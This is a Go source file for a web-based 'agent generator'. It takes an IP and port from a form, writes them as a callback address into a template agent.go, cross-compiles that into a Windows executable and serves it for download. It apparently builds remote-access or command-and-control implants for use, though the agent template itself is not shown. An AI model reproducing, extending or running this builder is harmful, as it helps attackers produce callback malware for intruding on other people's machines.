package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"text/template"
)

var agent *template.Template
var Link string

func init() {
	agent = template.Must(template.ParseFiles("templates/agent.html"))

}

func main() {
	fmt.Println("agent generator is ready ...")
	fmt.Println("http://0.0.0.0:7778")
	http.HandleFunc("/", index)
	http.Handle("/download/", http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	err := http.ListenAndServe(":7778", nil)
	checkerr(err)

}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		//fmt.Println("posted data")
		err := req.ParseForm()
		checkerr(err)
		ip := req.Form.Get("ip")
		port := req.Form.Get("port")
		creatagentgofile(ip, port)
		buildagent(`download/agent.exe`, `download/agent.go`)
		Link = "download/agent.exe"
		err = agent.Execute(respwrt, Link)
		os.Remove(`download/agent.go`)
		checkerr(err)

	} else {
		//fmt.Println("get method")
		err := agent.Execute(respwrt, nil)
		checkerr(err)
	}

}

func creatagentgofile(ip, port string) {
	baseframefile, err := os.Open("templates/agent.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()
	finalurl := `http://` + ip + ":" + port
	newgoFile, err := os.Create("download/agent.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "IP:PORT") {
			str = strings.Replace(str, "IP:PORT", finalurl, -1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func buildagent(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}
